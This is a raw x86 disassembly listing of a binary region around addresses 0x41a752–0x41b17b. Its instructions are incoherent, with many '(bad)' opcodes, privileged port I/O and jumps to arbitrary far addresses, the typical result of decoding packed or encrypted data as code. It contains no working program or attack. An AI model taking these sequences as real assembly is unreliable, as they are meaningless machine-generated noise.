  41a752:	mov    al,0x7c
  41a754:	retf   
  41a755:	push   eax
  41a756:	mov    al,0x11
  41a758:	in     eax,0x2f
  41a75a:	mov    bl,0x81
  41a75c:	ret    0xf64c
  41a75f:	xor    eax,0x3c4931c6
  41a764:	mov    cl,0xbe
  41a766:	pop    edi
  41a767:	inc    edi
  41a768:	mov    ds:0xa277bc8a,eax
  41a76d:	push   esp
  41a76e:	lods   al,BYTE PTR ds:[esi]
  41a76f:	xchg   esi,eax
  41a770:	xor    BYTE PTR [edx],ch
  41a772:	out    dx,eax
  41a773:	dec    ebp
  41a774:	fist   DWORD PTR [ebx-0x3d]
  41a777:	mov    dl,ch
  41a779:	add    dh,dl
  41a77b:	cli    
  41a77c:	xchg   esi,eax
  41a77d:	pop    edx
  41a77e:	cs pop esi
  41a780:	dec    eax
  41a781:	mov    eax,ds:0x5684df01
  41a786:	ret    
  41a787:	dec    esp
  41a788:	imul   eax,DWORD PTR [ebp-0x4f],0xffffffff
  41a78c:	enter  0xd177,0xf5
  41a790:	inc    esp
  41a791:	aad    0x47
  41a793:	push   edi
  41a794:	cs sbb eax,0xf9ae7785
  41a79a:	in     al,0x87
  41a79c:	xchg   esi,eax
  41a79d:	inc    esp
  41a79e:	xchg   edx,eax
  41a79f:	shl    BYTE PTR [edx],0x1
  41a7a2:	loopne 0x41a747
  41a7a4:	jnp    0x41a7a4
  41a7a6:	imul   esi,DWORD PTR [ecx],0x3ce641d9
  41a7ac:	sub    DWORD PTR [esi],esi
  41a7ae:	or     eax,0xb8fbd7f3
  41a7b3:	sub    DWORD PTR [esi+0x5495f53a],esi
  41a7b9:	loop   0x41a7b3
  41a7bb:	sub    al,0x24
  41a7bd:	pop    ss
  41a7be:	fist   DWORD PTR [ebx+0x33]
  41a7c1:	daa    
  41a7c2:	cmp    al,0xd
  41a7c4:	mov    ecx,0xc0652f04
  41a7c9:	jbe    0x41a772
  41a7cb:	(bad)  
  41a7cd:	mov    esi,0x369d1e66
  41a7d2:	pop    eax
  41a7d3:	inc    edi
  41a7d4:	or     BYTE PTR [esi-0x2e],ah
  41a7d7:	xadd   BYTE PTR [esi+eax*8],dl
  41a7db:	arpl   WORD PTR [esi+eax*2],bp
  41a7de:	sbb    esp,esi
  41a7e0:	iret   
  41a7e1:	rcr    DWORD PTR [esi+ebp*4+0x30f66c3b],1
  41a7e8:	dec    esp
  41a7e9:	sub    al,0x61
  41a7eb:	leave  
  41a7ec:	lock dec ecx
	...
  41a856:	repz xchg edi,eax
  41a858:	jae    0x41a7e1
  41a85a:	ja     0x41a843
  41a85c:	div    edi
  41a85e:	mov    ds:0xab5327ca,al
  41a863:	cmp    eax,0x1d679e23
  41a868:	add    DWORD PTR [eax],eax
  41a86a:	add    BYTE PTR [ecx],al
  41a86c:	add    BYTE PTR [eax],al
  41a86e:	and    DWORD PTR [esi-0x4de72c4a],ebx
  41a874:	xchg   DWORD PTR [esi*1+0x555d8fc0],esi
  41a87b:	or     BYTE PTR [eax+0x2ce68009],al
  41a881:	cmp    ecx,ebx
  41a883:	mov    ah,0xc
  41a885:	lahf   
  41a886:	sub    bh,BYTE PTR [esi+0x550edb14]
  41a88c:	jecxz  0x41a84a
  41a88e:	call   0x257d:0xa229c624
  41a895:	retf   0x7ab8
  41a898:	or     ebx,DWORD PTR [edx]
  41a89a:	mov    cl,0xc5
  41a89c:	(bad)  
  41a89e:	shr    BYTE PTR [esi-0x6699ac27],1
  41a8a4:	push   esi
  41a8a5:	test   al,0x3
  41a8a7:	int3   
  41a8a8:	test   BYTE PTR [ecx-0x79aa8ec5],dl
  41a8ae:	(bad)
  41a8b1:	jp     0x41a8b3
  41a8b3:	ret    0xba3f
  41a8b6:	xor    edi,DWORD PTR [esi+0x8a31570]
  41a8bc:	fstp   QWORD PTR [eax-0x6fd260b7]
  41a8c2:	mov    BYTE PTR [ebx+ecx*4-0x24],bh
  41a8c6:	mov    BYTE PTR [ecx+eiz*8+0x3b],dl
  41a8ca:	ins    DWORD PTR es:[edi],dx
  41a8cb:	ja     0x41a8c5
  41a8cd:	cmp    DWORD PTR [eax-0x3b],eax
  41a8d0:	repnz xchg esi,eax
  41a8d2:	add    eax,0x58568e7d
  41a8d7:	dec    ebp
  41a8d8:	lahf   
  41a8d9:	jmp    0x41a884
  41a8db:	mov    DWORD PTR [eax+0x5667c080],esp
  41a8e1:	push   edx
  41a8e2:	inc    ebp
  41a8e3:	cmp    bl,ch
  41a8e5:	adc    DWORD PTR [ebp+ecx*8-0x68],ecx
  41a8e9:	pop    ss
  41a8ea:	pop    ds
  41a8eb:	dec    ebp
  41a8ec:	int3   
  41a8ed:	mov    edi,DWORD PTR [ebp+0x68]
  41a8f0:	imul   edx,DWORD PTR ds:0xc938edee,0x2a24c613
  41a8fa:	and    BYTE PTR [ecx],dl
  41a8fc:	pusha  
  41a8fd:	bound  ecx,QWORD PTR [edx-0x26]
  41a900:	outs   dx,BYTE PTR ds:[esi]
  41a901:	ins    BYTE PTR es:[edi],dx
  41a902:	lahf   
  41a903:	pop    ds
  41a904:	clc    
  41a905:	cmc    
  41a906:	stc    
  41a907:	loopne 0x41a93f
  41a909:	sbb    eax,0x33539844
  41a90e:	push   edx
  41a90f:	shl    DWORD PTR [edi+ecx*8-0x6e],1
  41a913:	scas   eax,DWORD PTR es:[edi]
  41a914:	dec    edi
  41a915:	fwait
  41a916:	jl     0x41a8c9
  41a918:	and    DWORD PTR [eax-0x2c],0xe47eb762
  41a91f:	pop    es
  41a920:	nop
  41a921:	icebp  
  41a922:	push   ss
  41a923:	cmp    eax,0x6c1e59a1
  41a928:	inc    edi
  41a929:	repnz inc edi
  41a92b:	xchg   ecx,eax
  41a92c:	mov    al,ds:0xb4f3a897
  41a931:	(bad)  
  41a932:	stc    
  41a933:	imul   esi,DWORD PTR [edi],0xb979df5a
  41a939:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a93a:	sbb    cl,BYTE PTR [ebx]
  41a93c:	cmp    al,0x2e
  41a93e:	xchg   DWORD PTR [edi+0x6441148d],eax
  41a944:	int    0x48
  41a946:	push   ebp
  41a947:	push   ss
  41a948:	icebp  
  41a949:	mov    WORD PTR [eax],cs
  41a94b:	adc    al,ch
  41a94d:	sbb    ah,dl
  41a94f:	test   bh,0xa7
  41a952:	pop    edi
  41a953:	lea    eax,[ebx+0x14b55ebf]
  41a959:	inc    edi
  41a95a:	cs je  0x41a9bb
  41a95d:	mov    edx,0x6f930f9d
  41a962:	sub    BYTE PTR [ebp+0x4f],dh
  41a965:	pop    edx
  41a966:	cmp    BYTE PTR ds:[ebp+0x51eed0c6],bl
  41a96d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  41a9d6:	xor    eax,0xcf4a867e
  41a9db:	cli    
  41a9dc:	std    
  41a9dd:	jg     0x41aa2d
  41a9df:	push   edx
  41a9e0:	pushf  
  41a9e1:	dec    esp
  41a9e2:	pop    esp
  41a9e3:	add    ah,BYTE PTR [esi+0x46]
  41a9e6:	addr16 push ds
  41a9e8:	add    DWORD PTR [eax],eax
  41a9ea:	add    BYTE PTR [ecx],al
  41a9ec:	add    BYTE PTR [eax],al
  41a9ee:	dec    ecx
  41a9ef:	dec    ebp
  41a9f0:	add    BYTE PTR [edx+0x5b],dh
  41a9f3:	out    dx,eax
  41a9f4:	push   ss
  41a9f5:	imul   ecx,esp,0xffffff86
  41a9f8:	shr    DWORD PTR [edi-0x2b88ea37],0x67
  41a9ff:	lock inc edi
  41aa01:	jb     0x41a9cb
  41aa03:	out    dx,eax
  41aa04:	push   0xffffff9c
  41aa06:	pop    ebx
  41aa07:	inc    eax
  41aa08:	inc    esp
  41aa09:	xor    edx,ebx
  41aa0b:	test   eax,0x583a3fb4
  41aa10:	es mov dh,0xdc
  41aa13:	push   ds
  41aa14:	or     dh,dh
  41aa16:	lahf   
  41aa17:	xor    al,BYTE PTR [edi+ebx*2+0x1d]
  41aa1b:	mov    WORD PTR [edx],cs
  41aa1d:	(bad)
  41aa21:	add    ch,dl
  41aa23:	mov    al,ds:0xe51f16ef
  41aa28:	push   esp
  41aa29:	cdq    
  41aa2a:	mov    al,ds:0x4c466b4b
  41aa2f:	jnp    0x41a9cc
  41aa31:	adc    ebx,ebx
  41aa33:	sbb    DWORD PTR [eax],edi
  41aa35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa36:	imul   edx,edx,0xc6cf965b
  41aa3c:	cmp    BYTE PTR [ebx-0x30],0xbb
  41aa40:	mov    al,0x2d
  41aa42:	enter  0xec13,0x6f
  41aa46:	inc    ebx
  41aa47:	sub    cl,cl
  41aa49:	iret   
  41aa4a:	popa   
  41aa4b:	cmp    eax,0x78d2d251
  41aa50:	lock mov esp,0xd3124b5e
  41aa56:	pop    ecx
  41aa57:	loope  0x41aa7f
  41aa59:	and    al,0xdf
  41aa5b:	mov    esp,0x89dbaef5
  41aa60:	jnp    0x41aa90
  41aa62:	ret    
  41aa63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa64:	in     al,0x3b
  41aa66:	adc    BYTE PTR [edi+0x4858f36f],ah
  41aa6c:	adc    DWORD PTR ds:0x71de0a5b,esi
  41aa72:	lock pop ebp
  41aa74:	inc    ebp
  41aa75:	rol    DWORD PTR [ebx+0x35877570],0x75
  41aa7c:	aam    0x69
  41aa7e:	xchg   edx,eax
  41aa7f:	jbe    0x41aa06
  41aa81:	pop    esp
  41aa82:	cmp    al,0xde
  41aa84:	les    ecx,FWORD PTR [edx+0x574603ff]
  41aa8a:	ja     0x41aa11
  41aa8c:	sbb    BYTE PTR [ebp+ebp*2+0x28506bc7],dh
  41aa93:	push   ss
  41aa94:	mov    dl,0x1
  41aa96:	cmp    ebx,esi
  41aa98:	retf   
  41aa99:	stos   BYTE PTR es:[edi],al
  41aa9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa9b:	fbld   TBYTE PTR [esi+ecx*8-0x66]
  41aa9f:	and    esp,DWORD PTR [eax-0x55]
  41aaa2:	pop    ss
  41aaa3:	aam    0xfa
  41aaa5:	jae    0x41ab1a
  41aaa7:	mov    ch,0x1e
  41aaa9:	int    0xf6
  41aaab:	gs jae 0x41aae6
  41aaae:	mul    DWORD PTR [esi]
  41aab0:	xor    eax,0xea1f4ebc
  41aab5:	inc    eax
  41aab6:	jo     0x41aaa6
  41aab8:	test   al,0xab
  41aaba:	je     0x41aa83
  41aabc:	fsubrp st(0),st
  41aabe:	or     al,0x53
  41aac0:	mov    al,ds:0x55fe5d9b
  41aac5:	std    
  41aac6:	sub    DWORD PTR [ebx],edx
  41aac8:	fadd   st(6),st
  41aaca:	out    0x5d,eax
  41aacc:	jns    0x41ab2b
  41aace:	ret    0x1f8b
  41aad1:	jns    0x41aa9d
  41aad3:	mov    dh,0xae
  41aad5:	push   ecx
  41aad6:	pop    ecx
  41aad7:	imul   BYTE PTR [edi+0x7ca6eb4]
  41aadd:	test   al,0x23
  41aadf:	or     eax,0xdd9fe7c6
  41aae4:	or     DWORD PTR [edx-0x4c],0x3
  41aae8:	dec    ecx
  41aae9:	out    dx,al
  41aaea:	sar    ah,cl
  41aaec:	div    DWORD PTR [edi+0x0]
	...
  41ab53:	add    BYTE PTR [eax],al
  41ab55:	add    bh,dh
  41ab57:	add    esp,ebx
  41ab59:	mov    ah,0xfe
  41ab5b:	std    
  41ab5c:	inc    DWORD PTR [ebx+0x5f]
  41ab5f:	sbb    BYTE PTR [esi+0x43],ah
  41ab62:	ins    BYTE PTR es:[edi],dx
  41ab63:	mov    ds:0x1f6729a9,al
  41ab68:	add    DWORD PTR [eax],eax
  41ab6a:	add    BYTE PTR [ecx],al
  41ab6c:	add    BYTE PTR [eax],al
  41ab6e:	fs cs retf 
  41ab71:	sbb    al,BYTE PTR [edi+0x34132a6a]
  41ab77:	jo     0x41abe3
  41ab79:	cmp    eax,DWORD PTR ds:0x1ee586a6
  41ab7f:	and    al,0x46
  41ab81:	cwde   
  41ab82:	xlat   BYTE PTR cs:[ebx]
  41ab84:	push   edx
  41ab85:	gs dec ebx
  41ab87:	sub    esi,ecx
  41ab89:	xchg   edi,eax
  41ab8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab8b:	mov    cl,0xe7
  41ab8d:	pop    ss
  41ab8e:	and    eax,0x1880de65
  41ab93:	jge    0x41ab7c
  41ab95:	xchg   esi,eax
  41ab96:	addr16 push eax
  41ab98:	lods   al,BYTE PTR ds:[esi]
  41ab99:	mov    bl,0xa6
  41ab9b:	dec    ebx
  41ab9c:	pop    es
  41ab9d:	inc    ecx
  41ab9e:	repnz (bad) 
  41aba0:	lock push edi
  41aba2:	xlat   BYTE PTR ds:[ebx]
  41aba3:	sub    BYTE PTR [edx+0x2d020232],bh
  41aba9:	mov    WORD PTR [eax+0x1f66f692],?
  41abaf:	jg     0x41ab6b
  41abb1:	stos   DWORD PTR es:[edi],eax
  41abb2:	pop    esp
  41abb3:	call   FWORD PTR [ebp+0x65344cc2]
  41abb9:	mov    dh,0x9
  41abbb:	enter  0x9cfa,0x24
  41abbf:	lods   eax,DWORD PTR ds:[esi]
  41abc0:	data16 lock out 0x7,al
  41abc4:	jecxz  0x41abc9
  41abc6:	cmp    ch,cl
  41abc8:	test   BYTE PTR [ecx],dh
  41abca:	and    ebp,DWORD PTR [ebx+0x6b]
  41abcd:	test   DWORD PTR [ecx-0xc2d3447],esp
  41abd3:	push   ecx
  41abd4:	sub    BYTE PTR [eax+0x24],dl
  41abd7:	or     al,0x7e
  41abd9:	and    bh,dh
  41abdb:	lds    edx,FWORD PTR [ecx-0x36]
  41abde:	and    al,BYTE PTR [edx]
  41abe0:	add    DWORD PTR [esi-0x16c6148c],eax
  41abe6:	xchg   ebp,eax
  41abe7:	xor    eax,0xf7b3dd15
  41abec:	sub    BYTE PTR [ecx-0x5d],cl
  41abef:	pop    ss
  41abf0:	mov    eax,ds:0xe5e47b68
  41abf5:	or     BYTE PTR [esi-0x57],0xa3
  41abf9:	cmc    
  41abfa:	adc    al,0x1d
  41abfc:	mov    edi,0x2e895ac6
  41ac01:	add    al,BYTE PTR [esi+esi*1]
  41ac04:	fsubr  DWORD PTR [ecx+edx*2-0x20]
  41ac09:	mov    esp,0x7a20f880
  41ac0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac0f:	js     0x41ac21
  41ac11:	mov    ch,0x26
  41ac13:	loop   0x41ac0a
  41ac15:	cmp    DWORD PTR [edi],0x48
  41ac18:	retf   0xabd5
  41ac1b:	sbb    al,0xaa
  41ac1d:	test   BYTE PTR fs:0x96467d78,ah
  41ac24:	sbb    ebp,DWORD PTR ds:0x41a82a4e
  41ac2a:	pop    eax
  41ac2b:	rol    BYTE PTR [ebp+0x591e3a30],1
  41ac31:	dec    eax
  41ac32:	pushf  
  41ac33:	out    0xe6,eax
  41ac35:	jge    0x41abd3
  41ac37:	(bad)  
  41ac38:	into   
  41ac39:	jl     0x41ac52
  41ac3b:	cmp    eax,0xa6c20be2
  41ac40:	push   ss
  41ac41:	repz hlt 
  41ac43:	cdq    
  41ac44:	mov    dh,0x46
  41ac46:	add    edi,DWORD PTR [ebx+0x1e874530]
  41ac4c:	imul   ecx,DWORD PTR [edi-0x12],0x66a314c8
  41ac53:	imul   eax,ebx,0x3
  41ac56:	jb     0x41ac5a
  41ac58:	fs jecxz 0x41ac12
  41ac5b:	(bad)  
  41ac5d:	pusha  
  41ac5e:	ins    DWORD PTR es:[edi],dx
  41ac5f:	rcl    DWORD PTR [ebx-0x41451a42],0x87
  41ac66:	xchg   esp,eax
  41ac67:	lock xchg edi,eax
  41ac69:	sbb    eax,0x3861ccf4
	...
  41acd6:	push   0x49
  41acd8:	es cmp al,0x27
  41acdb:	jg     0x41ad57
  41acdd:	pop    edi
  41acde:	or     al,0x44
  41ace0:	xor    ah,BYTE PTR [ebp+edx*2+0xd]
  41ace4:	pop    DWORD PTR [ecx+0x12067]
  41acea:	add    BYTE PTR [ecx],al
  41acec:	add    BYTE PTR [eax],al
  41acee:	add    edi,DWORD PTR [ebx+0x73]
  41acf1:	cld    
  41acf2:	mov    ebp,DWORD PTR [eax+0x58]
  41acf5:	jae    0x41ad71
  41acf7:	mov    ch,0x2d
  41acf9:	inc    ebp
  41acfa:	loop   0x41ac9b
  41acfc:	(bad)  
  41acfd:	jne    0x41acc2
  41acff:	sub    al,bl
  41ad01:	mov    ecx,DWORD PTR [ecx*1+0x477d4e9b]
  41ad08:	jge    0x41ad84
  41ad0a:	push   esp
  41ad0b:	cmp    DWORD PTR [ecx],esi
  41ad0d:	pop    eax
  41ad0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad0f:	push   cs
  41ad10:	test   al,0xb1
  41ad12:	(bad)  
  41ad13:	and    dx,WORD PTR [esi-0x2]
  41ad17:	dec    ebx
  41ad18:	hlt    
  41ad19:	stc    
  41ad1a:	pop    esp
  41ad1b:	jmp    0xa9fc22c2
  41ad20:	mov    gs,esp
  41ad22:	fild   DWORD PTR [ecx]
  41ad24:	cmc    
  41ad25:	or     eax,0x306eae93
  41ad2a:	hlt    
  41ad2b:	cmp    bh,BYTE PTR [edx+edx*8+0x700e7f40]
  41ad32:	push   es
  41ad33:	mov    al,ds:0x6b318c00
  41ad38:	mov    esi,0x5dbceea4
  41ad3d:	popf   
  41ad3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad3f:	rol    ch,1
  41ad41:	or     bl,0x26
  41ad44:	jns    0x41adb1
  41ad46:	loop   0x41accc
  41ad48:	mov    DWORD PTR [ecx],esi
  41ad4a:	jg     0x41ad8b
  41ad4c:	inc    ecx
  41ad4d:	repz jne 0x41adba
  41ad50:	in     eax,dx
  41ad51:	iret   
  41ad52:	arpl   WORD PTR [ecx+0xc44ed90],di
  41ad58:	(bad)
  41ad5b:	aas    
  41ad5c:	into   
  41ad5d:	push   ebp
  41ad5e:	xchg   ecx,eax
  41ad5f:	test   BYTE PTR gs:[ecx+0x27],ch
  41ad63:	std    
  41ad64:	cli    
  41ad65:	pop    ebx
  41ad66:	dec    edx
  41ad67:	push   ss
  41ad68:	mov    bl,0x9b
  41ad6a:	pop    esi
  41ad6c:	sub    eax,0x5fba002c
  41ad71:	adc    ebx,edx
  41ad73:	jb     0x41ad65
  41ad75:	fs (bad) 
  41ad78:	ins    BYTE PTR es:[edi],dx
  41ad79:	imul   edx,DWORD PTR [eax-0x79e9e5b5],0x9e953ff0
  41ad83:	test   DWORD PTR [ebp+0x1ee10785],0x770d485
  41ad8d:	ds push edx
  41ad8f:	js     0x41ad2f
  41ad91:	jmp    0x4f19d2cd
  41ad96:	push   esp
  41ad97:	pushf  
  41ad98:	cmp    al,0x40
  41ad9a:	stos   BYTE PTR es:[edi],al
  41ad9b:	push   edx
  41ad9c:	retf   0x9b92
  41ad9f:	xor    DWORD PTR [ebp+0x6da164a6],ebp
  41ada5:	outs   dx,BYTE PTR ds:[esi]
  41ada6:	out    dx,al
  41ada7:	pop    es
  41ada8:	sbb    ch,cl
  41adaa:	loopne 0x41add3
  41adac:	cdq    
  41adad:	cmp    eax,0xa4fa258e
  41adb2:	leave  
  41adb3:	repnz cmp eax,DWORD PTR [eax-0x754d525a]
  41adba:	jl     0x41ad70
  41adbc:	shl    BYTE PTR ds:0x8d4ec2e3,0x91
  41adc3:	ret    
  41adc4:	dec    eax
  41adc5:	sub    eax,0xeb8af9b0
  41adca:	inc    ebx
  41adcb:	inc    edx
  41adcc:	sti    
  41adcd:	and    ch,dl
  41adcf:	or     esi,eax
  41add1:	pusha  
  41add2:	push   cs
  41add3:	mov    ebx,0xe5917afa
  41add8:	in     al,0x51
  41adda:	push   ebp
  41addb:	jmp    0x41adda
  41addd:	icebp  
  41adde:	int    0x39
  41ade0:	jne    0x41adac
  41ade2:	scas   al,BYTE PTR es:[edi]
  41ade3:	xor    DWORD PTR [eax],ebx
  41ade5:	pop    ss
  41ade6:	lahf   
  41ade7:	mov    al,ds:0x7bfa79a0
  41adec:	mov    dh,0x79
	...
  41ae56:	push   ebp
  41ae57:	clc    
  41ae58:	or     DWORD PTR [esi-0x4280053],ebx
  41ae5e:	dec    edi
  41ae5f:	push   eax
  41ae60:	cmp    DWORD PTR [ebx+ebp*1+0x67a929d8],esp
  41ae67:	and    DWORD PTR [ecx],eax
  41ae69:	add    BYTE PTR [eax],al
  41ae6b:	add    DWORD PTR [eax],eax
  41ae6d:	add    dh,bl
  41ae6f:	cs or  cl,ch
  41ae72:	or     DWORD PTR [edi-0x77fa082d],ebx
  41ae78:	mov    dh,0xb1
  41ae7a:	xchg   BYTE PTR [eax+0x38],bh
  41ae7d:	push   edi
  41ae7e:	pop    ecx
  41ae7f:	xor    BYTE PTR [ecx],bl
  41ae81:	iret   
  41ae82:	sbb    DWORD PTR [esi],ecx
  41ae84:	cmp    cl,cl
  41ae86:	add    edx,DWORD PTR [eax+0x14]
  41ae89:	sub    ch,BYTE PTR [esp+esi*1-0x4d]
  41ae8d:	pop    ss
  41ae8e:	jbe    0x41ae39
  41ae90:	adc    esp,DWORD PTR [eax+0x3f]
  41ae93:	iret   
  41ae94:	sbb    al,0xbe
  41ae96:	mov    eax,0xf2555c5e
  41ae9b:	sub    cl,al
  41ae9d:	sar    DWORD PTR [ecx+0x72],0x74
  41aea1:	sbb    eax,0x31b069a8
  41aea6:	sub    al,0x54
  41aea8:	add    BYTE PTR [edi],bl
  41aeaa:	jl     0x41aed9
  41aeac:	push   cs
  41aead:	cli    
  41aeae:	or     BYTE PTR [edx+0x6450b403],ch
  41aeb4:	mov    ebx,0x7f8f00d7
  41aeb9:	sti    
  41aeba:	out    dx,al
  41aebb:	mov    ah,0x8
  41aebd:	pop    es
  41aebe:	and    al,0x83
  41aec0:	out    0x10,eax
  41aec2:	pop    ebp
  41aec3:	dec    eax
  41aec4:	sbb    edx,0x1df9b1de
  41aeca:	cmp    al,0xba
  41aecc:	xchg   esi,eax
  41aecd:	mov    dh,BYTE PTR [esi+0x448844d5]
  41aed3:	fld    TBYTE PTR [ecx-0x80]
  41aed6:	fcom   QWORD PTR [ebp+ebp*8-0x52f9d5b5]
  41aedd:	and    ch,BYTE PTR [edx]
  41aedf:	int    0x1e
  41aee1:	pusha  
  41aee2:	mov    ah,0x3b
  41aee4:	adc    DWORD PTR [ecx+0x46],0xd7b75fe8
  41aeeb:	cmp    ch,BYTE PTR [edi]
  41aeed:	(bad)  
  41aeee:	int3   
  41aeef:	int3   
  41aef0:	int    0x5c
  41aef2:	mov    ah,0xb0
  41aef4:	push   edi
  41aef5:	mov    ebp,0x6189fc1e
  41aefa:	xchg   esi,eax
  41aefb:	jecxz  0x41aed2
  41aefd:	inc    edi
  41aefe:	call   0x690a:0xdae0ac8
  41af05:	stos   DWORD PTR es:[edi],eax
  41af06:	push   ebx
  41af07:	std    
  41af08:	adc    edx,ebp
  41af0a:	or     al,0x2a
  41af0c:	and    BYTE PTR [edi-0x4d],0x65
  41af10:	popa   
  41af11:	xor    DWORD PTR [eax+0x395c1685],ebx
  41af17:	clc    
  41af18:	(bad)  
  41af19:	jp     0x41aecf
  41af1b:	cld    
  41af1c:	pop    ebx
  41af1d:	add    ah,BYTE PTR [ebx-0xc]
  41af20:	(bad)  
  41af21:	int    0x1e
  41af23:	xor    ebp,DWORD PTR [edx]
  41af25:	fmul   DWORD PTR [eax+ebx*2+0x9]
  41af29:	std    
  41af2a:	jg     0x41aebf
  41af2c:	sub    BYTE PTR [edi+0xc],ah
  41af2f:	ins    BYTE PTR es:[edi],dx
  41af30:	pop    ss
  41af31:	cwde   
  41af32:	or     ecx,DWORD PTR [ebx-0x705fe2a9]
  41af38:	les    ecx,FWORD PTR [ecx+edx*2-0x1]
  41af3c:	fisub  DWORD PTR [ecx-0x426a647c]
  41af42:	ret    0xe739
  41af45:	mov    dh,0xef
  41af47:	add    al,0xec
  41af4a:	adc    ebx,ebx
  41af4c:	cmp    DWORD PTR [ebp-0x6899c9c5],eax
  41af52:	push   eax
  41af53:	pop    ecx
  41af54:	js     0x41aee3
  41af56:	test   eax,0xca361951
  41af5b:	in     eax,0xfe
  41af5d:	jb     0x41afb2
  41af5f:	iret   
  41af60:	rcl    BYTE PTR [ebx-0x6f],1
  41af63:	xor    al,0xf3
  41af65:	sti    
  41af66:	test   DWORD PTR ds:0x599f983f,esp
  41af6c:	scas   al,BYTE PTR es:[edi]
  41af6d:	aad    0x0
	...
  41afd3:	add    BYTE PTR [eax],al
  41afd5:	add    ch,al
  41afd7:	stc    
  41afd8:	lods   eax,DWORD PTR ds:[esi]
  41afd9:	xor    edi,DWORD PTR [ebp+0x15ffdf77]
  41afdf:	mov    ecx,0x6ae944ee
  41afe4:	rcl    dl,0x67
  41afe7:	and    al,BYTE PTR [ecx]
  41afe9:	add    BYTE PTR [eax],al
  41afeb:	add    DWORD PTR [eax],eax
  41afed:	add    BYTE PTR [edx-0x1aafbf9],ah
  41aff3:	xlat   BYTE PTR ds:[ebx]
  41aff4:	lock jmp 0x5cd:0xd01861b5
  41affc:	cmp    DWORD PTR [eax+ebx*2-0x75494388],esp
  41b003:	mov    dh,0x24
  41b005:	and    dh,dh
  41b007:	js     0x41af8e
  41b009:	dec    edi
  41b00a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b00b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b00c:	outs   dx,DWORD PTR ds:[esi]
  41b00d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b00e:	scas   al,BYTE PTR es:[edi]
  41b00f:	cwde   
  41b010:	xor    eax,DWORD PTR [esi]
  41b012:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b014:	inc    edi
  41b015:	push   0x8136edfa
  41b01a:	and    al,0x62
  41b01c:	stos   DWORD PTR es:[edi],eax
  41b01d:	jae    0x41b07d
  41b01f:	mov    ebx,0x4b8c978
  41b024:	(bad)  
  41b025:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b026:	popf   
  41b027:	bound  edx,QWORD PTR [ecx+ebx*4-0x60]
  41b02b:	adc    al,0xa1
  41b02d:	(bad)  
  41b02f:	stos   DWORD PTR es:[edi],eax
  41b030:	retf   
  41b031:	cmp    dl,0xdb
  41b034:	xchg   edi,eax
  41b035:	push   0x95cc787c
  41b03a:	fmul   DWORD PTR [ecx]
  41b03c:	push   0x8400fada
  41b041:	cs jle 0x41b00e
  41b044:	dec    ecx
  41b045:	sub    eax,0xd7f90e6
  41b04a:	fstp   DWORD PTR [ebx]
  41b04c:	push   es
  41b04d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b04e:	nop    DWORD PTR [ebx]
  41b051:	xor    al,0xcc
  41b053:	aas    
  41b054:	js     0x41b04b
  41b056:	add    ch,BYTE PTR ds:0xfd6fbf8a
  41b05c:	mov    bh,0xfe
  41b05e:	sbb    al,0x4a
  41b060:	dec    esp
  41b061:	sub    al,0x78
  41b063:	sar    DWORD PTR [edx+0xb64f50a],1
  41b069:	setbe  BYTE PTR [ecx+0x6528cd91]
  41b070:	inc    eax
  41b071:	adc    dh,BYTE PTR [edi-0x59]
  41b074:	lods   eax,DWORD PTR ds:[esi]
  41b075:	mov    al,0x3b
  41b077:	adc    edx,DWORD PTR [edi-0x7293409a]
  41b07d:	sub    edx,esi
  41b07f:	repz lahf 
  41b081:	arpl   WORD PTR [edi+0xa],bp
  41b084:	test   eax,0x816746f8
  41b089:	(bad)  
  41b08a:	(bad)  
  41b08b:	in     eax,dx
  41b08c:	dec    esi
  41b08d:	mov    BYTE PTR [ebx+0x7d],ch
  41b090:	jbe    0x41b091
  41b092:	jp     0x41b074
  41b094:	stos   DWORD PTR es:[edi],eax
  41b095:	sbb    eax,0xba6bbc4a
  41b09a:	out    0x6c,eax
  41b09c:	lods   eax,DWORD PTR ds:[esi]
  41b09d:	test   ecx,edx
  41b09f:	cli    
  41b0a0:	jno    0x41b06a
  41b0a2:	push   edi
  41b0a3:	push   ebx
  41b0a4:	outs   dx,BYTE PTR ds:[esi]
  41b0a5:	jmp    0x8d2f:0x63465842
  41b0ac:	outs   dx,DWORD PTR ds:[esi]
  41b0ad:	push   esi
  41b0ae:	pusha  
  41b0af:	mov    edi,0xa44e14b4
  41b0b4:	dec    esp
  41b0b5:	fidiv  WORD PTR [ebp+0x60f4608e]
  41b0bb:	push   esp
  41b0bc:	test   al,0x1c
  41b0be:	pop    es
  41b0bf:	add    DWORD PTR [ecx-0x3140784f],ebp
  41b0c5:	xchg   edx,eax
  41b0c6:	cmp    DWORD PTR [edx+ebx*1-0x65730ea9],edi
  41b0cd:	sub    ah,0x26
  41b0d0:	inc    edi
  41b0d1:	test   eax,0x88af2687
  41b0d6:	test   eax,0x1a033395
  41b0db:	ss mov esi,0xd1fac8ac
  41b0e1:	xor    eax,0xa7452b
  41b0e6:	imul   ebp,ebp,0xfffffff6
  41b0e9:	imul   eax,DWORD PTR [ecx],0xf44c2f
	...
  41b153:	add    BYTE PTR [eax],al
  41b155:	add    dh,al
  41b157:	ficom  WORD PTR [eax]
  41b159:	stos   DWORD PTR es:[edi],eax
  41b15a:	sbb    bh,ch
  41b15c:	(bad)  
  41b15d:	call   DWORD PTR [edx+edx*8+0x75]
  41b161:	mov    edi,0x94d0de71
  41b166:	and    eax,DWORD PTR [bx+di]
  41b169:	add    BYTE PTR [eax],al
  41b16b:	add    DWORD PTR [eax],eax
  41b16d:	add    BYTE PTR [ebx+eax*2+0x3f],dl
  41b171:	int    0x2d
  41b173:	pushf  
  41b174:	call   0x76b5:0x55225930
  41b17b:	ja     0x41b105
